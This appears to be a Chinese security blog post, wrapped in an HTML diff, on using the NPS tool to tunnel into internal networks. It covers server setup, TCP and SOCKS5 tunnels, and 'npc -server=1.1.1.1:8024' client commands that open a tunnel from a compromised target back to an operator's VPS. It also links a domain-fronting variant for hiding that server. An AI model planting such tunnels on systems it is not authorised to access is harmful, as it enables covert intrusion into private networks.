@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>利用nps进行内网穿透 - B1gd0g</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
+    <meta name="description" content="NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用nps进行内网穿透">
+<meta property="og:url" content="https://b1gd0g.github.io/2021/12/21/%E4%BD%BF%E7%94%A8NPS%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/index.html">
+<meta property="og:site_name" content="B1gd0g">
+<meta property="og:description" content="NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201450785.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201450924.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201453960.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201453646.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201453158.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201451599.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201452736.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201452069.jpg">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221233933.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201452657.jpg">
+<meta property="article:published_time" content="2021-12-20T17:00:06.000Z">
+<meta property="article:modified_time" content="2022-10-11T02:31:48.999Z">
+<meta property="article:author" content="B1gd0g">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201450785.jpg">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1665474214423">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1665474214423">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="B1gd0g">
+            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>15</div>
+        <div><span>标签</span>12</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                杀软对比
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                社工密码
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                我的导航
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    一言
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/tools/">tools</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
+    </div>
+    
+  </div>
+
+    
+        
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 B1gd0g
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
+            <img src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201452657.jpg" alt="利用nps进行内网穿透" loading="lazy">
+            <h1>利用nps进行内网穿透</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2021年12月21日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/tools/">tools</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约1k字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要3分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <p>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p>
+<a id="more"></a>
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
+<h2 id="安装启动"><a href="#安装启动" class="headerlink" title="安装启动"></a>安装启动</h2><p>下载对应系统压缩包后，解压，然后进入解压后的文件夹执行命令进行安装（注意客户端与服务端的区分）</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201450785.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<h3 id="linux-darwin"><a href="#linux-darwin" class="headerlink" title="linux/darwin"></a>linux/darwin</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo ./nps install<br>sudo nps <span class="hljs-literal">start</span><br>停止和重启可用，<span class="hljs-literal">stop</span>和restart<br></code></pre></td></tr></table></figure>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">nps.exe install     <span class="hljs-comment">#管理员身份运行</span><br>nps.exe <span class="hljs-literal">start</span><br>停止和重启可用，<span class="hljs-literal">stop</span>和restart<br></code></pre></td></tr></table></figure>
+<h2 id="web端管理"><a href="#web端管理" class="headerlink" title="web端管理"></a>web端管理</h2><p>进入web界面，公网ip:web界面端口（默认8080），密码默认为123</p>
+<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>配置文件在 /etc/nps/conf/nps.conf ,只需要修改下面的web的host、账号、密码和端口号即可，其他可保持不变，web端可更直观的进行其他项的更改</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web_port</td>
+<td>web管理端口</td>
+</tr>
+<tr>
+<td>web_password</td>
+<td>web界面管理密码</td>
+</tr>
+<tr>
+<td>web_username</td>
+<td>web界面管理账号</td>
+</tr>
+<tr>
+<td>bridge_port</td>
+<td>服务端客户端通信端口</td>
+</tr>
+<tr>
+<td>https_proxy_port</td>
+<td>域名代理https代理监听端口</td>
+</tr>
+<tr>
+<td>http_proxy_port</td>
+<td>域名代理http代理监听端口</td>
+</tr>
+<tr>
+<td>auth_key</td>
+<td>web api密钥</td>
+</tr>
+<tr>
+<td>bridge_type</td>
+<td>客户端与服务端连接方式kcp或tcp</td>
+</tr>
+<tr>
+<td>public_vkey</td>
+<td>客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</td>
+</tr>
+<tr>
+<td>ip_limit</td>
+<td>是否限制ip访问，true或false或忽略</td>
+</tr>
+<tr>
+<td>flow_store_interval</td>
+<td>服务端流量数据持久化间隔，单位分钟，忽略表示不持久化</td>
+</tr>
+<tr>
+<td>log_level</td>
+<td>日志输出级别</td>
+</tr>
+<tr>
+<td>auth_crypt_key</td>
+<td>获取服务端authKey时的aes加密密钥，16位</td>
+</tr>
+<tr>
+<td>p2p_ip</td>
+<td>服务端Ip，使用p2p模式必填</td>
+</tr>
+<tr>
+<td>p2p_port</td>
+<td>p2p模式开启的udp端口</td>
+</tr>
+</tbody></table>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201450924.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>此为简单快速实用教程，如需高级教程请移步至：<a target="_blank" rel="noopener" href="https://gitee.com/mickelfeng/nps">https://gitee.com/mickelfeng/nps</a></p>
+<h2 id="web页面"><a href="#web页面" class="headerlink" title="web页面"></a>web页面</h2><p>通过修改的账号密码，进行登陆，创建新客户端，添加认证，密钥等配置，下列三个最好选择是</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201453960.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201453646.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201453158.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>此处即可看到web端已经给出客户端命令，也就是我们在目标机器中需执行的命令</p>
+<h3 id="TCP隧道-UDP（同理）"><a href="#TCP隧道-UDP（同理）" class="headerlink" title="TCP隧道/UDP（同理）"></a>TCP隧道/UDP（同理）</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201451599.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>此处以远程桌面为例：通过新建TCP隧道，进行TCP连接，客户ID对应客户端处所生成的对应ID，服务器端口选择未被占用端口，否则新建失败，打通TCP隧道之后，只需通过远程桌面连接VPS的4444端口——即可连接到内网10.10.231.12的远程桌面</p>
+<h3 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201452736.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>socks5代理与其他同理，此处只列举两处常用隧道，同理新建socks5隧道后，可直接利用socks5代理工具，连接VPS的5555端口即可对内网进行访问。（下图使用浏览器socks5代理访问内网）</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201452069.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<h2 id="客户端上线"><a href="#客户端上线" class="headerlink" title="客户端上线"></a>客户端上线</h2><p>想方设法把对应目标系统的客户端搞到目标机器上，利用自动配置好的命令，web版可直观的查看机器上线与否。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221233933.jpg" alt="image.png" data-caption="image.png" loading="lazy"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./npc <span class="hljs-attribute">-server</span>=1.1.1.1:8024 <span class="hljs-attribute">-vkey</span>=12345678 <span class="hljs-attribute">-type</span>=tcp<br>npc.exe <span class="hljs-attribute">-server</span>=1.1.1.1:8024 <span class="hljs-attribute">-vkey</span>=12345678 <span class="hljs-attribute">-type</span>=tcp<br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201452657.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>客户端上线后就可以自由发挥了。</p>
+<h2 id="改造版"><a href="#改造版" class="headerlink" title="改造版"></a>改造版</h2><p>通过websocket协议让FRP用上域前置，可以隐藏真实服务ip地址。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%E7%BB%AD.html">https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%E7%BB%AD.html</a></p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/uknowsec/frpModify">https://github.com/uknowsec/frpModify</a></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">工具介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%90%AF%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">安装启动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-darwin"><span class="toc-number">2.1.</span> <span class="toc-text">linux&#x2F;darwin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">2.2.</span> <span class="toc-text">windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%AB%AF%E7%AE%A1%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">web端管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">修改配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E9%A1%B5%E9%9D%A2"><span class="toc-number">4.</span> <span class="toc-text">web页面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP%E9%9A%A7%E9%81%93-UDP%EF%BC%88%E5%90%8C%E7%90%86%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">TCP隧道&#x2F;UDP（同理）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socks5"><span class="toc-number">4.2.</span> <span class="toc-text">socks5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8A%E7%BA%BF"><span class="toc-number">5.</span> <span class="toc-text">客户端上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E9%80%A0%E7%89%88"><span class="toc-number">6.</span> <span class="toc-text">改造版</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1665474214425"></script>
+
+
+
+</body>
+
+</html>
